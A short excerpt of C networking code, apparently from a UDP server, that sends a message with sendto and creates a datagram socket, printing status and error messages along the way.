        if ( sendto(serSockDes, msg, strlen(msg), 0, (struct sockaddr*)&cliAddr, cliAddrLen) < 0 ) {
    perror("sending error...\n");
    close(serSockDes);
    exit(-1);
  }
  else {
    printf ("sending\n");
  }
    }
    
  if ((serSockDes = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
    perror("socket creation error...\n");
    exit(-1);
  }
  else {
    printf ("socket created\n");
  }
 }
}
 
